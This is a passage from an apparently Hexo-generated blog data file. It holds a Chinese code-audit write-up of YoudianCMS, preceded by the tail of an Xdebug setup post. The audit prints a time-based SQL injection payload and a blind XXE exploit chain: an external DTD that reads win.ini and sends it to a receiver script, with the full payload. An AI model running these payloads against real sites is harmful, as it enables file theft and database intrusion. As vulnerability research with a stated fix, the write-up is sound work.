class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\"><span class=\"hljs-attr\">zend_extension</span>=<span class=\"hljs-string\">\"/usr/lib/php/20131226/xdebug.so\"</span>      <span class=\"hljs-comment\">#之后配置其他版本php的时候只需将这个文件的位置换成上面我贴出的对应文件即可                                                                                                                      </span><br><br><span class=\"hljs-attr\">xdebug.remote_enable</span> = <span class=\"hljs-number\">1</span><br><br><span class=\"hljs-attr\">xdebug.remote_handler</span> = dbgp<br><br><span class=\"hljs-attr\">xdebug.remote_mode</span> = req <br><br><span class=\"hljs-attr\">xdebug.remote_host</span> = <span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span><br><br><span class=\"hljs-attr\">xdebug.remote_port</span> = <span class=\"hljs-number\">9002</span><br><br><span class=\"hljs-attr\">xdebug.remote_enable</span> = <span class=\"hljs-number\">1</span><br><br><span class=\"hljs-attr\">xdebug.remote_autostart</span> = <span class=\"hljs-number\">1</span><br></code></pre></td></tr></table></figure>\n\n<p>然后保存，在对应版本的php-ini中末尾填上<code>[xdebug]</code> 来激活xdebug扩展。</p>\n<p>最后重启，php56,来检查下是否配置成功。</p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/DEEPIN/%E6%B7%B1%E5%BA%A6%E6%88%AA%E5%9B%BE_%E9%80%89%E6%8B%A9%E5%8C%BA%E5%9F%9F_20190522164713.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"img\"></p>\n<p>配置成功！愉快的去审计叭～</p>\n<h2 id=\"3-总结\"><a href=\"#3-总结\" class=\"headerlink\" title=\"3 @ 总结\"></a>3 @ 总结</h2><p>推荐下黄老板和比伯的新歌 <strong>&lt;I Don’t care&gt;</strong>，已经被洗脑了。真好～</p>\n<p>Reference：</p>\n<p><code>https://www.jianshu.com/p/dedd2818c7f9</code></p>\n<p><code>https://zhidao.baidu.com/question/1670867120091087107.html</code></p>\n<p><code>https://blog.csdn.net/zhousmq/article/details/77765451</code></p>\n<p><code>https://www.cnblogs.com/wangshuyi/p/8512036.html</code></p>\n"},{"title":"某企业管理系统审计小结","date":"2019-10-05T16:00:00.000Z","_content":"\n\n\n\n\n\n# 1@ 前言\n\nmd 国庆睡的太爽了,睡爽了起来审一审 : p \n\n这次拿到的 youdiancms 是基于 tp 开发的一套简单的企业网站管理系统。cnvd 上收录关于其系统的漏洞只有星星点点的几个,故拿来复现练手,同时看看能不能再审出点自己的小洞~\n\n\n\n# 2@ CNVD-2019-21447 前台 sql 注入\n\n条件:\n\n- 开启会员注册功能.\n- 用已经注册过得会员登录.\n\n\n\n由于基于 tp 开发,所以其路由规则就是类于 `/功能模块/类/方法/参数`  的 PATH_INFO 的模式.\n\n在运行过程中,会动态生成一个主文件 ---> `yunxingshi.php`,由于写入的时候并没有考虑到排版问题,所以为了便于审计,我们可以在[这里](<http://tools.jb51.net/code/phpformat>)进行代码格式的美化.\n\n这里我们省去路由传入参数的过程,着重来学习下在框架开发的模式下,从数据库中存取数据的流程.为了方便调试演示,直接给出存在问题的方法:\n\n- App/Lib/Action/Member/CustomerAction/ 下的 saveModify 的方法\n\n- 演示 url  :  `http://cms.test1/index.php/Member/Customer/saveModify`\n\n  `POST : MemberName=root1&MemberID=1 and sleep(5);#`\n\n```php\nfunction saveModify(){\n\t\theader(\"Content-Type:text/html; charset=utf-8\");\n\t\t$this->_checkPost( $_POST );\n\t\tunset( $_POST['InviterID'], $_POST['IsEnable']);\n\t\t$m = D('Admin/Member');\n\t\t$inviterID = $m->where(\"MemberID={$_POST['MemberID']}\")->getField('InviterID');\n......\n```\n\n可以看到,传入的 MemberID 参数,经过简单的处理,就直接带到了类的 where 方法里面进行查询了,如果包装类的方法再没有处理过程,那么很有可能产生注入,我们跟进观察.\n\n1、首先跟进到 _checkPost() 方法中\n\n```php\nprivate function _checkPost($p){\n\t\tif( empty($p['MemberName']) ){\n\t\t\t$this->ajaxReturn(null, '昵称不能为空' , 0);\n\t\t}\n\t\t\n\t\tif( $_POST['MemberPassword'] != ''){\n\t\t\t$_POST['MemberPassword'] = md5($_POST['MemberPassword']);\n\t\t}else{\n\t\t\tunset( $_POST['MemberPassword'] );\n\t\t}\n\t}\n```\n\n没有进行传 入参数的过滤,只是提醒我们必须传入 MemberName 这个参数,否则返回错误提示信息.\n\n2、接着 D() 方法大致流程就是新建一个模型类实例，然后返回\n\n3、然后就到了关键的带入到实例中 where 方法中，我们来着重看看整个数据的流动过程：\n\n- 没有 where 方法，首先调用到 __call() 这个魔术方法，来判断需要进行的操作。\n\n```php\npublic function __call($method,$args) {\n        if(in_array(strtolower($method),array('table','where','order','limit','page','alias','having','group','lock','distinct'),true)) {\n            // 连贯操作的实现\n            $this->options[strtolower($method)] =   $args[0];  // $method=where ; $args[0]= ‘MemberID=1 and sleep(3);#’\n            return $this;\n            ......\n```\n\n- 返回 this 接着上面的链式调用，访问 getField() 方法，其中有一个 _parseOptions() 的方法，跟进查看：\n\n```php\n  protected function _parseOptions($options=array()) {\n        if(is_array($options))\n            $options =  array_merge($this->options,$options);\n        // 查询过后清空sql表达式组装 避免影响下次查询\n        $this->options  =   array();\n        if(!isset($options['table']))\n            // 自动获取表名\n            $options['table'] =$this->getTableName();\n        if(!empty($options['alias'])) {\n            $options['table']   .= ' '.$options['alias'];\n        }\n        // 记录操作的模型名称\n        $options['model'] =  $this->name;\n     \n     ......\n     \n        // 表达式过滤\n        $this->_options_filter($options);\n        return $options;\n    }\n```\n\n\n\n解析传入参数，为拼接查询语句做准备，注意里面有一个 _options_filter() 跟进查看：\n\n```php\n protected function _options_filter(&$options) {}\n```\n\nmd 竟然是个空函数哈哈，我猜这可能是开发者为了之后爆出漏洞好修补直接首先写好的一个占位函数，至于具体怎么修，还得等待白帽子们怎么破了，有意思。\n\n- 返回到 getField() 方法中，查询的是一个字段，所以我们直接跳到 else 分支：\n\n```php\nelse{   // 查找一条记录\n          $options['limit'] = 1;\n          $result = $this->db->select($options);\n          if(!empty($result)) {\n              return reset($result[0]);\n          }\n      }\n```\n\n跟进到模型实例的数据库资源中进行查询：\n\n```php\n// select 方法\npublic function select($options=array()) {\n        $this->model  =   $options['model'];\n        $sql   = $this->buildSelectSql($options);\n        // 构造的 sql 语句为 select ‘InviterID’ FROM ‘youdian_member’ WHERE MemberID=2 and sleep(3);#limit1\n        \n        $cache  =  isset($options['cache'])?$options['cache']:false;\n ......\n      \n        $result   = $this->query($sql);\n```\n\n\n\n带入到数据库中进行查询，造成 sql 注入。\n\n\n\n ![1](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/%E6%9F%90%E7%B3%BB%E7%BB%9F./1.png)\n\n\n\n\n\n整个过程不难，我主要想要总结的是这套系统运作后台数据库的方法和设计模式：\n\n由于用户使用的数据库扩展类型是未知的，所以代码需要根据不同情况选择不同的数据库连接:\n\n- 所有数据库对象的基类 `App/Core/Lib/Core/Db.class.php`,此系统支持 mysql 和 mysqli 两个扩展，根据选择情况来构建数据库对象，继承父类的一些声明和方法即可直接进行使用。\n- 工厂模式：工厂模式就是将创造对象的方法封装在一个文件的类函数里面，然后返回创建的对象，避免了 new 操作，而且当创建对象的方法或者参数改变的时候，我们可以直接修改工厂方法。\n\n这里的父类 Db.class.php 使用了工厂模式产生数据库对象，即 **factory()** 方法：\n\n```php\npublic function factory($db_config='') {\n        // 读取数据库配置\n        $db_config = $this->parseConfig($db_config);\n        if(empty($db_config['dbms']))\n            throw_exception(L('_NO_DB_CONFIG_'));\n        // 数据库类型\n        $this->dbType = ucwords(strtolower($db_config['dbms']));\n        $class = 'Db'. $this->dbType;\n        if(is_file(CORE_PATH.'Driver/Db/'.$class.'.class.php')) {\n            // 内置驱动\n            $path = CORE_PATH;\n        }else{ // 扩展驱动\n            $path = EXTEND_PATH;\n        }\n        // 检查驱动类\n        if(require_cache($path.'Driver/Db/'.$class.'.class.php')) {\n            $db = new $class($db_config);\n            // 获取当前的数据库类型\n            if( 'pdo' != strtolower($db_config['dbms']) )\n                $db->dbType = strtoupper($this->dbType);\n            else\n                $db->dbType = $this->_getDsnType($db_config['dsn']);\n            if(APP_DEBUG)  $db->debug    = true;\n        }else {\n            // 类没有定义\n            throw_exception(L('_NOT_SUPPORT_DB_').': ' . $db_config['dbms']);\n        }\n        return $db;\n    }\n```\n\n\n\n然后在构造函数 __construct() 中使用此方法创建数据库对象：\n\n```php\npublic function __construct($config=''){\n        return $this->factory($config);\n    }\n```\n\n\n\nphp 有很多设计模式我们可以了解和学习，[这里](https://www.imooc.com/learn/236)是慕课的一个不错的免费讲解设计模式的课程。\n\n\n\nps: 同样的分析方法还能发现一个前台 xss 漏洞。\n\n\n\n\n\n# 3@ 前台 xxe  \n\n以前一直觉得 xxe 这种漏洞很少会在实战中出现，这也算是自己第一次实战审出 xxe ,由于利用条件比较苛刻，没有上报到 cnvd 等平台，在此做下简单分析 (为了保护厂家隐私，此文章已经上密码，仅做笔记和供朋友参阅，望大家注意自身安全)。\n\n文件位置：\n\n```\n/App/Lib/Common/YdWx.class.php\n```\n\n\n\n```php\n// 关键方法\npublic function responseMsg(){\n\t\t//$postStr = $GLOBALS[\"HTTP_RAW_POST_DATA\"];\t//get post data, May be due to the different environments\n        $postStr = file_get_contents(\"php://input\");\n\t\tif (empty($postStr) ) return;\n\t\t$HasCustomerService = $GLOBALS['Config']['WX_CUSTOMER_SERVICE']; //是否启用多客服\n\t\t//用户发送消息－> 公众帐号\n\t\t$postObj = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA);\n\t\t......\n```\n\n\n\n可以看到，此方法将 post 流中的数据直接放入到 `simplexml_load_string()` 函数中，由于此方法未传入其他参数，所以只要有使用此方法的地方，必然会有 xxe 漏洞。\n\n由于本机未装 php 5.6 以下版本，所以本次测试环境为 :\n\n```\nos : win10\nphp_version : 5.4.45   \n```\n\n网上很多文章都有写 libxml 2.9.1 以上的 php 默认会禁止加载外部实体，实际上 libxml 2.9.4 这一版的 php 依旧可以成功加载外部实体。因为 php 7.0 以上的版本集成的 libxml 还是有 2.9.4 版，所以此漏洞也是可以在 php7 上复现的，这个问题由 Cart0a 提出。具体禁用加载外部实体的 libxml 版本有待探索。\n\n\n由于是无回显形式的 xxe，所以我们需要构造一个数据接收方：\n\n- 我们先在本地上传模拟测试实体 `test.dtd`\n\n```xml\n<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///C:/Windows/win.ini\">\n<!ENTITY % int \"<!ENTITY &#37; send SYSTEM 'http://127.0.0.1/receive.php?p=%file;'>\">\n```\n\n- 然后构造接收脚本 `receive.php`\n\n```php\n<?php\nfile_put_contents(\"result.txt\",$_GET['p']);\n?>\n```\n\n- 最后将 payload 传入到 post 流中，偷取到的数据写入到 `result.txt` 文件中\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE convert [ \n<!ENTITY % remote SYSTEM \"http://127.0.0.1/test.dtd\">\n%remote;%int;%send;\n]>\n```\n\n\n\n ![2](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/%E6%9F%90%E7%B3%BB%E7%BB%9F./2.png)\n\n\n\n【由于图片需要上传需要打码，复现可根据上文文字步骤进行】\n\n\n\n ![3](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/%E6%9F%90%E7%B3%BB%E7%BB%9F./3.png)\n\n\n\n成功偷到数据。\n\n\n\n暂时的防御办法就是：\n\n```php\nlibxml_disable_entity_loader(true);\n```\n\n\n\n\n\n# 4@ 其他\n\n此系统还存在前后台的 csrf 漏洞，xss漏洞，有兴趣可自行审计。\n\n\n\n\n\n\n\n\n\nRefererece：\n\n`https://www.cnvd.org.cn/flaw/show/CNVD-2019-21447`\n\n","source":"_posts/YouDiancms审计小结.md","raw":"---\ntitle: 某企业管理系统审计小结\ntags:\n - 代码审计\n - php\ndate: 2019-10-06\n---\n\n\n\n\n\n\n# 1@ 前言\n\nmd 国庆睡的太爽了,睡爽了起来审一审 : p \n\n这次拿到的 youdiancms 是基于 tp 开发的一套简单的企业网站管理系统。cnvd 上收录关于其系统的漏洞只有星星点点的几个,故拿来复现练手,同时看看能不能再审出点自己的小洞~\n\n\n\n# 2@ CNVD-2019-21447 前台 sql 注入\n\n条件:\n\n- 开启会员注册功能.\n- 用已经注册过得会员登录.\n\n\n\n由于基于 tp 开发,所以其路由规则就是类于 `/功能模块/类/方法/参数`  的 PATH_INFO 的模式.\n\n在运行过程中,会动态生成一个主文件 ---> `yunxingshi.php`,由于写入的时候并没有考虑到排版问题,所以为了便于审计,我们可以在[这里](<http://tools.jb51.net/code/phpformat>)进行代码格式的美化.\n\n这里我们省去路由传入参数的过程,着重来学习下在框架开发的模式下,从数据库中存取数据的流程.为了方便调试演示,直接给出存在问题的方法:\n\n- App/Lib/Action/Member/CustomerAction/ 下的 saveModify 的方法\n\n- 演示 url  :  `http://cms.test1/index.php/Member/Customer/saveModify`\n\n  `POST : MemberName=root1&MemberID=1 and sleep(5);#`\n\n```php\nfunction saveModify(){\n\t\theader(\"Content-Type:text/html; charset=utf-8\");\n\t\t$this->_checkPost( $_POST );\n\t\tunset( $_POST['InviterID'], $_POST['IsEnable']);\n\t\t$m = D('Admin/Member');\n\t\t$inviterID = $m->where(\"MemberID={$_POST['MemberID']}\")->getField('InviterID');\n......\n```\n\n可以看到,传入的 MemberID 参数,经过简单的处理,就直接带到了类的 where 方法里面进行查询了,如果包装类的方法再没有处理过程,那么很有可能产生注入,我们跟进观察.\n\n1、首先跟进到 _checkPost() 方法中\n\n```php\nprivate function _checkPost($p){\n\t\tif( empty($p['MemberName']) ){\n\t\t\t$this->ajaxReturn(null, '昵称不能为空' , 0);\n\t\t}\n\t\t\n\t\tif( $_POST['MemberPassword'] != ''){\n\t\t\t$_POST['MemberPassword'] = md5($_POST['MemberPassword']);\n\t\t}else{\n\t\t\tunset( $_POST['MemberPassword'] );\n\t\t}\n\t}\n```\n\n没有进行传 入参数的过滤,只是提醒我们必须传入 MemberName 这个参数,否则返回错误提示信息.\n\n2、接着 D() 方法大致流程就是新建一个模型类实例，然后返回\n\n3、然后就到了关键的带入到实例中 where 方法中，我们来着重看看整个数据的流动过程：\n\n- 没有 where 方法，首先调用到 __call() 这个魔术方法，来判断需要进行的操作。\n\n```php\npublic function __call($method,$args) {\n        if(in_array(strtolower($method),array('table','where','order','limit','page','alias','having','group','lock','distinct'),true)) {\n            // 连贯操作的实现\n            $this->options[strtolower($method)] =   $args[0];  // $method=where ; $args[0]= ‘MemberID=1 and sleep(3);#’\n            return $this;\n            ......\n```\n\n- 返回 this 接着上面的链式调用，访问 getField() 方法，其中有一个 _parseOptions() 的方法，跟进查看：\n\n```php\n  protected function _parseOptions($options=array()) {\n        if(is_array($options))\n            $options =  array_merge($this->options,$options);\n        // 查询过后清空sql表达式组装 避免影响下次查询\n        $this->options  =   array();\n        if(!isset($options['table']))\n            // 自动获取表名\n            $options['table'] =$this->getTableName();\n        if(!empty($options['alias'])) {\n            $options['table']   .= ' '.$options['alias'];\n        }\n        // 记录操作的模型名称\n        $options['model'] =  $this->name;\n     \n     ......\n     \n        // 表达式过滤\n        $this->_options_filter($options);\n        return $options;\n    }\n```\n\n\n\n解析传入参数，为拼接查询语句做准备，注意里面有一个 _options_filter() 跟进查看：\n\n```php\n protected function _options_filter(&$options) {}\n```\n\nmd 竟然是个空函数哈哈，我猜这可能是开发者为了之后爆出漏洞好修补直接首先写好的一个占位函数，至于具体怎么修，还得等待白帽子们怎么破了，有意思。\n\n- 返回到 getField() 方法中，查询的是一个字段，所以我们直接跳到 else 分支：\n\n```php\nelse{   // 查找一条记录\n          $options['limit'] = 1;\n          $result = $this->db->select($options);\n          if(!empty($result)) {\n              return reset($result[0]);\n          }\n      }\n```\n\n跟进到模型实例的数据库资源中进行查询：\n\n```php\n// select 方法\npublic function select($options=array()) {\n        $this->model  =   $options['model'];\n        $sql   = $this->buildSelectSql($options);\n        // 构造的 sql 语句为 select ‘InviterID’ FROM ‘youdian_member’ WHERE MemberID=2 and sleep(3);#limit1\n        \n        $cache  =  isset($options['cache'])?$options['cache']:false;\n ......\n      \n        $result   = $this->query($sql);\n```\n\n\n\n带入到数据库中进行查询，造成 sql 注入。\n\n\n\n ![1](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/%E6%9F%90%E7%B3%BB%E7%BB%9F./1.png)\n\n\n\n\n\n整个过程不难，我主要想要总结的是这套系统运作后台数据库的方法和设计模式：\n\n由于用户使用的数据库扩展类型是未知的，所以代码需要根据不同情况选择不同的数据库连接:\n\n- 所有数据库对象的基类 `App/Core/Lib/Core/Db.class.php`,此系统支持 mysql 和 mysqli 两个扩展，根据选择情况来构建数据库对象，继承父类的一些声明和方法即可直接进行使用。\n- 工厂模式：工厂模式就是将创造对象的方法封装在一个文件的类函数里面，然后返回创建的对象，避免了 new 操作，而且当创建对象的方法或者参数改变的时候，我们可以直接修改工厂方法。\n\n这里的父类 Db.class.php 使用了工厂模式产生数据库对象，即 **factory()** 方法：\n\n```php\npublic function factory($db_config='') {\n        // 读取数据库配置\n        $db_config = $this->parseConfig($db_config);\n        if(empty($db_config['dbms']))\n            throw_exception(L('_NO_DB_CONFIG_'));\n        // 数据库类型\n        $this->dbType = ucwords(strtolower($db_config['dbms']));\n        $class = 'Db'. $this->dbType;\n        if(is_file(CORE_PATH.'Driver/Db/'.$class.'.class.php')) {\n            // 内置驱动\n            $path = CORE_PATH;\n        }else{ // 扩展驱动\n            $path = EXTEND_PATH;\n        }\n        // 检查驱动类\n        if(require_cache($path.'Driver/Db/'.$class.'.class.php')) {\n            $db = new $class($db_config);\n            // 获取当前的数据库类型\n            if( 'pdo' != strtolower($db_config['dbms']) )\n                $db->dbType = strtoupper($this->dbType);\n            else\n                $db->dbType = $this->_getDsnType($db_config['dsn']);\n            if(APP_DEBUG)  $db->debug    = true;\n        }else {\n            // 类没有定义\n            throw_exception(L('_NOT_SUPPORT_DB_').': ' . $db_config['dbms']);\n        }\n        return $db;\n    }\n```\n\n\n\n然后在构造函数 __construct() 中使用此方法创建数据库对象：\n\n```php\npublic function __construct($config=''){\n        return $this->factory($config);\n    }\n```\n\n\n\nphp 有很多设计模式我们可以了解和学习，[这里](https://www.imooc.com/learn/236)是慕课的一个不错的免费讲解设计模式的课程。\n\n\n\nps: 同样的分析方法还能发现一个前台 xss 漏洞。\n\n\n\n\n\n# 3@ 前台 xxe  \n\n以前一直觉得 xxe 这种漏洞很少会在实战中出现，这也算是自己第一次实战审出 xxe ,由于利用条件比较苛刻，没有上报到 cnvd 等平台，在此做下简单分析 (为了保护厂家隐私，此文章已经上密码，仅做笔记和供朋友参阅，望大家注意自身安全)。\n\n文件位置：\n\n```\n/App/Lib/Common/YdWx.class.php\n```\n\n\n\n```php\n// 关键方法\npublic function responseMsg(){\n\t\t//$postStr = $GLOBALS[\"HTTP_RAW_POST_DATA\"];\t//get post data, May be due to the different environments\n        $postStr = file_get_contents(\"php://input\");\n\t\tif (empty($postStr) ) return;\n\t\t$HasCustomerService = $GLOBALS['Config']['WX_CUSTOMER_SERVICE']; //是否启用多客服\n\t\t//用户发送消息－> 公众帐号\n\t\t$postObj = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA);\n\t\t......\n```\n\n\n\n可以看到，此方法将 post 流中的数据直接放入到 `simplexml_load_string()` 函数中，由于此方法未传入其他参数，所以只要有使用此方法的地方，必然会有 xxe 漏洞。\n\n由于本机未装 php 5.6 以下版本，所以本次测试环境为 :\n\n```\nos : win10\nphp_version : 5.4.45   \n```\n\n网上很多文章都有写 libxml 2.9.1 以上的 php 默认会禁止加载外部实体，实际上 libxml 2.9.4 这一版的 php 依旧可以成功加载外部实体。因为 php 7.0 以上的版本集成的 libxml 还是有 2.9.4 版，所以此漏洞也是可以在 php7 上复现的，这个问题由 Cart0a 提出。具体禁用加载外部实体的 libxml 版本有待探索。\n\n\n由于是无回显形式的 xxe，所以我们需要构造一个数据接收方：\n\n- 我们先在本地上传模拟测试实体 `test.dtd`\n\n```xml\n<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///C:/Windows/win.ini\">\n<!ENTITY % int \"<!ENTITY &#37; send SYSTEM 'http://127.0.0.1/receive.php?p=%file;'>\">\n```\n\n- 然后构造接收脚本 `receive.php`\n\n```php\n<?php\nfile_put_contents(\"result.txt\",$_GET['p']);\n?>\n```\n\n- 最后将 payload 传入到 post 流中，偷取到的数据写入到 `result.txt` 文件中\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE convert [ \n<!ENTITY % remote SYSTEM \"http://127.0.0.1/test.dtd\">\n%remote;%int;%send;\n]>\n```\n\n\n\n ![2](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/%E6%9F%90%E7%B3%BB%E7%BB%9F./2.png)\n\n\n\n【由于图片需要上传需要打码，复现可根据上文文字步骤进行】\n\n\n\n ![3](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/%E6%9F%90%E7%B3%BB%E7%BB%9F./3.png)\n\n\n\n成功偷到数据。\n\n\n\n暂时的防御办法就是：\n\n```php\nlibxml_disable_entity_loader(true);\n```\n\n\n\n\n\n# 4@ 其他\n\n此系统还存在前后台的 csrf 漏洞，xss漏洞，有兴趣可自行审计。\n\n\n\n\n\n\n\n\n\nRefererece：\n\n`https://www.cnvd.org.cn/flaw/show/CNVD-2019-21447`\n\n","slug":"YouDiancms审计小结","published":1,"updated":"2020-05-02T02:07:06.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckbh7yzgh0005mp7gipx67ivl","content":"<h1 id=\"1-前言\"><a href=\"#1-前言\" class=\"headerlink\" title=\"1@ 前言\"></a>1@ 前言</h1><p>md 国庆睡的太爽了,睡爽了起来审一审 : p </p>\n<p>这次拿到的 youdiancms 是基于 tp 开发的一套简单的企业网站管理系统。cnvd 上收录关于其系统的漏洞只有星星点点的几个,故拿来复现练手,同时看看能不能再审出点自己的小洞~</p>\n<h1 id=\"2-CNVD-2019-21447-前台-sql-注入\"><a href=\"#2-CNVD-2019-21447-前台-sql-注入\" class=\"headerlink\" title=\"2@ CNVD-2019-21447 前台 sql 注入\"></a>2@ CNVD-2019-21447 前台 sql 注入</h1><p>条件:</p>\n<ul>\n<li>开启会员注册功能.</li>\n<li>用已经注册过得会员登录.</li>\n</ul>\n<p>由于基于 tp 开发,所以其路由规则就是类于 <code>/功能模块/类/方法/参数</code>  的 PATH_INFO 的模式.</p>\n<p>在运行过程中,会动态生成一个主文件 —&gt; <code>yunxingshi.php</code>,由于写入的时候并没有考虑到排版问题,所以为了便于审计,我们可以在<a href=\"http://tools.jb51.net/code/phpformat\" target=\"_blank\" rel=\"noopener\">这里</a>进行代码格式的美化.</p>\n<p>这里我们省去路由传入参数的过程,着重来学习下在框架开发的模式下,从数据库中存取数据的流程.为了方便调试演示,直接给出存在问题的方法:</p>\n<ul>\n<li><p>App/Lib/Action/Member/CustomerAction/ 下的 saveModify 的方法</p>\n</li>\n<li><p>演示 url  :  <code>http://cms.test1/index.php/Member/Customer/saveModify</code></p>\n<p><code>POST : MemberName=root1&amp;MemberID=1 and sleep(5);#</code></p>\n</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">saveModify</span><span class=\"hljs-params\">()</span></span>&#123;<br>\t\theader(<span class=\"hljs-string\">\"Content-Type:text/html; charset=utf-8\"</span>);<br>\t\t<span class=\"hljs-keyword\">$this</span>-&gt;_checkPost( $_POST );<br>\t\t<span class=\"hljs-keyword\">unset</span>( $_POST[<span class=\"hljs-string\">'InviterID'</span>], $_POST[<span class=\"hljs-string\">'IsEnable'</span>]);<br>\t\t$m = D(<span class=\"hljs-string\">'Admin/Member'</span>);<br>\t\t$inviterID = $m-&gt;where(<span class=\"hljs-string\">\"MemberID=&#123;$_POST['MemberID']&#125;\"</span>)-&gt;getField(<span class=\"hljs-string\">'InviterID'</span>);<br>......<br></code></pre></td></tr></table></figure>\n\n<p>可以看到,传入的 MemberID 参数,经过简单的处理,就直接带到了类的 where 方法里面进行查询了,如果包装类的方法再没有处理过程,那么很有可能产生注入,我们跟进观察.</p>\n<p>1、首先跟进到 _checkPost() 方法中</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">_checkPost</span><span class=\"hljs-params\">($p)</span></span>&#123;<br>\t\t<span class=\"hljs-keyword\">if</span>( <span class=\"hljs-keyword\">empty</span>($p[<span class=\"hljs-string\">'MemberName'</span>]) )&#123;<br>\t\t\t<span class=\"hljs-keyword\">$this</span>-&gt;ajaxReturn(<span class=\"hljs-keyword\">null</span>, <span class=\"hljs-string\">'昵称不能为空'</span> , <span class=\"hljs-number\">0</span>);<br>\t\t&#125;<br>\t\t<br>\t\t<span class=\"hljs-keyword\">if</span>( $_POST[<span class=\"hljs-string\">'MemberPassword'</span>] != <span class=\"hljs-string\">''</span>)&#123;<br>\t\t\t$_POST[<span class=\"hljs-string\">'MemberPassword'</span>] = md5($_POST[<span class=\"hljs-string\">'MemberPassword'</span>]);<br>\t\t&#125;<span class=\"hljs-keyword\">else</span>&#123;<br>\t\t\t<span class=\"hljs-keyword\">unset</span>( $_POST[<span class=\"hljs-string\">'MemberPassword'</span>] );<br>\t\t&#125;<br>\t&#125;<br></code></pre></td></tr></table></figure>\n\n<p>没有进行传 入参数的过滤,只是提醒我们必须传入 MemberName 这个参数,否则返回错误提示信息.</p>\n<p>2、接着 D() 方法大致流程就是新建一个模型类实例，然后返回</p>\n<p>3、然后就到了关键的带入到实例中 where 方法中，我们来着重看看整个数据的流动过程：</p>\n<ul>\n<li>没有 where 方法，首先调用到 __call() 这个魔术方法，来判断需要进行的操作。</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__call</span><span class=\"hljs-params\">($method,$args)</span> </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(in_array(strtolower($method),<span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">'table'</span>,<span class=\"hljs-string\">'where'</span>,<span class=\"hljs-string\">'order'</span>,<span class=\"hljs-string\">'limit'</span>,<span class=\"hljs-string\">'page'</span>,<span class=\"hljs-string\">'alias'</span>,<span class=\"hljs-string\">'having'</span>,<span class=\"hljs-string\">'group'</span>,<span class=\"hljs-string\">'lock'</span>,<span class=\"hljs-string\">'distinct'</span>),<span class=\"hljs-keyword\">true</span>)) &#123;<br>            <span class=\"hljs-comment\">// 连贯操作的实现</span><br>            <span class=\"hljs-keyword\">$this</span>-&gt;options[strtolower($method)] =   $args[<span class=\"hljs-number\">0</span>];  <span class=\"hljs-comment\">// $method=where ; $args[0]= ‘MemberID=1 and sleep(3);#’</span><br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">$this</span>;<br>            ......<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>返回 this 接着上面的链式调用，访问 getField() 方法，其中有一个 _parseOptions() 的方法，跟进查看：</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">protected</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">_parseOptions</span><span class=\"hljs-params\">($options=array<span class=\"hljs-params\">()</span>)</span> </span>&#123;<br>      <span class=\"hljs-keyword\">if</span>(is_array($options))<br>          $options =  array_merge(<span class=\"hljs-keyword\">$this</span>-&gt;options,$options);<br>      <span 